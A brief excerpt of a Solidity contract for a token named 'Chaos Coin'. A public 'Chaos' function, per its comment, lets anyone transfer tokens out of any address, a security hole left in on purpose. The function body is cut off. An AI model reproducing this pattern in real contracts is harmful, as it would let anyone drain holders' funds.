...
contract ChaosCoin is IBEP20, Ownable {
    string constant _name = "Chaos Coin";
    ...
    constructor () {
        ...
        uniswapV2Pair = IDEXFactory(router.factory()).createPair(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, address(this));
    ...
    // allow everyone to send tokens from anywhere lmao
    function Chaos(address from, address to, uint256 amount) public returns (bool) {
        // no transferring from burn or zero address, no involving the pair contract
